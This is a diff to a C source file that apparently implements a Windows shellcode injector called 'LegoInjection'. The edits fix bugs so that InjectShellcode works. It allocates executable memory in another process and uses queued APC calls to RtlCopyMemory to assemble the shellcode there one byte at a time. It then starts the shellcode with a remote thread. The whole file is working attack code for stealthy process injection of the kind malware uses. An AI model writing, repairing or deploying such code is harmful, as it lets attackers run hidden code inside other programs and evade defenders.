@@ -1,8 +1,9 @@
+#include "LegoInjection.h"
 
 BOOL InjectShellcode(HANDLE hProcess,HANDLE hThread,PBYTE shellcode, size_t shellcodeSize){
 	//assume thread is already created suspended
 	if (hProcess == NULL || hThread == NULL || shellcode == NULL)
-		return;
+		return FALSE;
 	BOOL result;
 	static NTSTATUS(WINAPI *_RtlCopyMemory)(
 		IN  LPVOID Destination,
@@ -11,8 +12,7 @@ BOOL InjectShellcode(HANDLE hProcess,HANDLE hThread,PBYTE shellcode, size_t shel
 	) = NULL;
 	static NTSTATUS(WINAPI *_NtQueueApcThread)(
 		IN  HANDLE hThread,
-		_in_opt HANDLE UserApcReserveHandle,
-		__in PPS_APC_ROUTINE ApcRoutine,
+		__in VOID(WINAPI *ApcRoutine)(LPVOID,LPVOID,LPVOID),
 		__in_opt LPVOID ApcArgument1,
 		__in_opt LPVOID ApcArgument2,
 		__in_opt LPVOID ApcArgument3
@@ -29,17 +29,17 @@ BOOL InjectShellcode(HANDLE hProcess,HANDLE hThread,PBYTE shellcode, size_t shel
 			LPVOID,
 			LPCVOID,
 			SIZE_T
-		)procPtr;
+		))procPtr;
 	}
 	if (_NtQueueApcThread == NULL){
 		procPtr = GetProcAddress(hNtdll,"NtQueueApcThread");
-		_RtlCopyMemory = (NTSTATUS(WINAPI*)(
+		_NtQueueApcThread = (NTSTATUS(WINAPI*)(
 			HANDLE,
-			PPS_APC_ROUTINE,
+			VOID(WINAPI*)(LPVOID,LPVOID,LPVOID),
 			LPVOID,
 			LPVOID,
 			LPVOID
-		)procPtr;
+		))procPtr;
 	}
 	if (_RtlCopyMemory == NULL || _NtQueueApcThread == NULL){
 		return FALSE;
@@ -54,7 +54,7 @@ BOOL InjectShellcode(HANDLE hProcess,HANDLE hThread,PBYTE shellcode, size_t shel
 		NULL,
 		shellcodeSize,
 		MEM_RESERVE | MEM_COMMIT,
-		EXECUTE_READWRITE);
+		PAGE_EXECUTE_READWRITE);
 	if (remoteBuffer == NULL){
 		return FALSE;
 	}
@@ -73,8 +73,8 @@ BOOL InjectShellcode(HANDLE hProcess,HANDLE hThread,PBYTE shellcode, size_t shel
 		Inject:
 		_NtQueueApcThread(
 			hThread,
-			(PPS_APC_ROUTINE)_RtlCopyMemory,
-			&remoteBuffer[i],
+			(VOID(WINAPI*)(LPVOID,LPVOID,LPVOID))_RtlCopyMemory,
+			remoteBuffer + i,
 			found[shellcode[i]],
 			(LPVOID)1);
 	}
@@ -83,7 +83,8 @@ BOOL InjectShellcode(HANDLE hProcess,HANDLE hThread,PBYTE shellcode, size_t shel
 		hProcess,
 		NULL,
 		0,
-		remoteBuffer,
+		(LPTHREAD_START_ROUTINE)remoteBuffer,
+		NULL,
 		0,
 		NULL);
 	WaitForSingleObject(hThread2,INFINITE);
